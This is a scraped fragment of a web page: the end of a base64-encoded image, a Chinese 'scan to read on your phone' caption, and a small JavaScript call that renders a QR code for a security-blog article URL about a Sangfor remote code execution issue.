+dIPAynxivedwP8+kLojKvwRa13ReWn76Hl5xz+pgeOdWX3tBfM8jLr+qp2FeRFSD8FZzf8+kNlFL219An89kD79ziF3g3rfCiTf9c5h7oPoQC/ZOHD/3rAJXwsYdRh537Nc/GqzBEg/CGrs9ZA8cH0PuX3Y6/AOcXodv7tvyLT12weiQ9C8CNEh2Ovk+kX1QjWxtFn0POSa6h3tAfFBUJ95Ub2jeRjr977DQPbJa/3zJ7ANBDI1eI6rLTp9sfvUxVX+TF/VV92zXOXPwnpRP+RM1EXzIsx9+mGet75wG0iRK95/AtdA3j+DYQf/AgAA//8fOAVNAAAABklEQVQDAC7wYYmryaHRAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sangfor\_osm-netConfig-del\_route-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 